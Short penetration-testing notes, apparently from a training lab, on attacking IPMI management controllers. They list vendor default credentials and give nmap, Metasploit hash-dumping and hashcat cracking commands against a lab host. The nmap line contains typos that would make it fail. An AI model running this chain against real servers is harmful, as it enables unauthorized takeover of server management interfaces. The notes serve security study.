
- Port 623 
- Systems that are use IPMI are called Baseboard Management Controllers
- Default passwords
	- Dell iDRAC
		- root
		- calvin
	- HP iLO
		- Administrator
		- randomized 8-character string consiting of numbers and upercase letters
	- Supermicro IPMI 
		- ADMIN
		- ADMIN

### Footprinting 

```bash
sudo nmpa- -sU --script ipmi-verison -p 623 ilo.inlanefreight.local

# Using Metasploit 
use auxiliary/scanner/ipmi/ipmi_version

# Metasploit to dump hashes
use auxiliary/scanner/ipmi/ipmi_dumphashes

# Using hashcat to crack the hashes 
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

```

